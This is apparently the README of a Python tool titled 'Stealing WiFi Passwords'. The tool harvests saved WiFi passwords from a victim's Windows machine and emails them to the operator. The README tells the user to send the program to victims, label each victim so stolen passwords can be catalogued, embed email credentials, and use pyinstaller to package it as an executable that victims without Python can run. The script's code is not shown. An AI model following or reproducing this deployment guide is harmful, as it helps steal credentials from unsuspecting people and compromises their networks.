# STEALING WIFI PASSWORDS

what the title says. just a work of concept, not truly viable irl because of the sheer amount of warnings the user gets before running the code (if emailed, gmail will warn you, if uploaded to google drive then shared, drive will warn, chrome will warn before downloading, windows defender will warn before running, etc.)

### Required Libraries:

- subprocess

- os

- smtplib

- email

- datetime

### Environment Variables:

If you are to send this to a victim, you must have your email address and email password saved to the code in plain text. This is very dangerous and should be only done if you do not care for the wellbeing of said email address. I used environment variables because I don't need to get doxxed again. 

### victim_name:

Before running, change the name of the victim. This is so that you can easily recall who's passwords are what once you have a backlog of password data.

### pyinstaller:

If you want someone to run this on their own computer even though they might not have python, you have to convert the .py file into a executable the pyinstaller library. First install pyinstaller (pip install pyinstaller), then type into the command line:

```batch
pyinstaller --onefile "stealWifiPass.py"
```

The "--onefile" tag will create the executable into one file.

Once the process is complete, you can find the executable in the "dist" folder.
